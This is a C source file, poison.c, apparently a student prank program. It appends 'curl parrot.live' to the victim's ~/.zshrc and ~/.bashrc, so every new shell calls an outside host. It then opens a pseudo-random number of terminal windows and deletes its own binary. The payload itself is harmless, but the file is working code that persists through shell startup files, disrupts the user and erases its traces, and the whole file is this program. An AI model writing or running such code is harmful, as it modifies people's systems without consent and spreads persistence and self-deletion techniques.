/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   poison.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/06/22 01:28:09 by mgama             #+#    #+#             */
/*   Updated: 2023/06/25 15:20:25 by mgama            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../utils/process.h"
#include "../utils/time.h"

int	copy_alias(char **envp)
{
	int			i;
	int			fd;
	char		*path;
	static char	*command = "curl parrot.live";
	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};

	printf("\033[36mStart shell rc modifications...\033[0m\n");
	i = -1;
	while (file_list[++i])
	{
		path = ft_strjoin(getenv("HOME"), file_list[i]);
		if (!path)
			return (1);
		printf("opening and writing in %s\n", path);
		fd = open(path, O_CREAT | O_RDWR | O_APPEND);
		free(path);
		if (fd < 0)
			return (1);
		dprintf(fd, "%s\n", command);
		close(fd);
	}
	printf("--------------------\n");
	return (0);
}

int	main(int ac, char **av, char **envp)
{
	int		i;
	char	home_buffer[PATH_MAX];
	char	*rm_cmd[] = {"open", "-a", "Terminal", NULL};

	realpath(av[0], home_buffer);
	printf("currrent file path = %s\n", home_buffer);
	copy_alias(envp);
	i = -1;
	while (++i < (ft_abs_time() % 10) * 2)
	{
#if __APPLE__
		process_child(rm_cmd, envp);
#else
		system("gnome-terminal");
#endif /* __APPLE__ */
	}
	if (remove(home_buffer) < 0)
		dprintf(2, "Could not remove file %s", home_buffer), perror("");
	return (0);
}
